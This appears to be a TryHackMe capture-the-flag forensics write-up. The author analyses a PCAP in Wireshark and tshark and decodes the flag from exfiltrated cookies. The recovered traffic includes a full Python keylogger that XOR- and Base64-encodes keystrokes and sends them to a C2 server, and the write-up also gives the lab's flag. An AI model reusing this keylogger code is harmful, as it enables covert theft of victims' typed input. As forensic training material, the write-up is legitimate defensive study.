# [Packed Light](https://tryhackme.com/room/hh-packedlight-02e5330c)

- Day 4 of hackers holiday. 
- A forensic lab involving analyzing a PCAP file.
![screenshot](../data/pl1.png)
- Downlaod the attachment and unzip it.

```
~/TryHackMe/Hackers_holiday ❯ unzip packed-light-forensics-1784224937659.zip 
Archive:  packed-light-forensics-1784224937659.zip
  inflating: traffic.pcapng       
```
- open the traffic in wireshark.
![screenshot](../data/pl2.png)

- In @0xMia's STORY  he mentioned his laptop is pingin an 8080 adress. lets see what the port deals with.
- Lets apply the wireshark filter 
```
tcp.dstport == 8080
```
![screenshot](../data/pl3.png)

- we can see lots of tcp and http packets lets narrow it down to http.

```
tcp.dstport == 8080 and http
```
![screenshot](../data/pl4.png)
- The first http request is downloaded a updates.py file lets see what it is . as it is only http not https we cna clearly see the traffic without any encryption.
- Righ click on the packet and select follow > tcp stream.
```
C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```
- This code is a simple keylogger that captures keystrokes, lightly obfuscates them with XOR, Base64-encodes the result, and sends each keystroke to a remote server in an HTTP cookie.

```
Keyboard Input
      ↓
Capture key
      ↓
XOR encrypt
      ↓
Base64 encode
      ↓
Place in HTTP Cookie
      ↓
Send GET request to C2 server 
```
- It is a simple encryption easily reversed, before that we need to extract the encryption text from the cookie field. for that i am going to use tshark.

```
tshark -r traffic.pcapng -Y http -T fields -e http.cookie
tshark: Couldn't load plugin 'falco-events.so': /usr/lib/x86_64-linux-gnu/libgrpc++.so.1.51: undefined symbol: _Z29grpc_json_get_string_propertyRKN9grpc_core4JsonEPKcPN4absl7debian96StatusE
tshark: Error processing rsa_privkeys:
Error loading RSA key file /home/light/Root_me/netwoking/rsakey.pem: No such file or directory


hotel_sess_state=HA==

hotel_sess_state=AA==

hotel_sess_state=BQ==

hotel_sess_state=Mw==

hotel_sess_state=Hg==

hotel_sess_state=ew==

hotel_sess_state=Og==

hotel_sess_state=fA==

hotel_sess_state=Fw==

hotel_sess_state=eQ==

hotel_sess_state=Ow==

hotel_sess_state=Fw==

hotel_sess_state=Pw==

hotel_sess_state=fA==

hotel_sess_state=PA==

hotel_sess_state=Kw==

hotel_sess_state=IA==

hotel_sess_state=eQ==

hotel_sess_state=Jg==

hotel_sess_state=Lw==

hotel_sess_state=Fw==

hotel_sess_state=eA==

hotel_sess_state=Pg==

hotel_sess_state=LQ==

hotel_sess_state=Gg==

hotel_sess_state=Fw==

hotel_sess_state=MQ==

hotel_sess_state=eA==

hotel_sess_state=PQ==

hotel_sess_state=NQ==
```
- Now replace the "hotel_sess_state=" from the above output and note the base64 values . 
- I wrote this simple python script to decod this cahrecters . 
```
import base64

KEY = b"H0t3lSt@ff0NlyK3epS3cr3t!"

encoded_strings = [
    "HA==",
    "AA==",
    "BQ==",
    "Mw==",
    "Hg==",
    "ew==",
    "Og==",
    "fA==",
    "Fw==",
    "eQ==",
    "Ow==",
    "Fw==",
    "Pw==",
    "fA==",
    "PA==",
    "Kw==",
    "IA==",
    "eQ==",
    "Jg==",
    "Lw==",
    "Fw==",
    "eA==",
    "Pg==",
    "LQ==",
    "Gg==",
    "Fw==",
    "MQ==",
    "eA==",
    "PQ==",
    "NQ==",
]

plaintext = ""

for s in encoded_strings:
    encrypted = base64.b64decode(s)
    decrypted = bytes([encrypted[0] ^ KEY[0]])
    plaintext += decrypted.decode("utf-8", errors="replace")

print("Recovered text:")
print(repr(plaintext))
```
- The code simply decode each encoded_string from base64 , then xor it using the key and combines it to get the final word.
```
 python3 decode.py 
Recovered text:
'THM{V3r4_1s_w4tch1ng_0veR_y0u}'
```
**FLAG: THM{V3r4_1s_w4tch1ng_0veR_y0u}**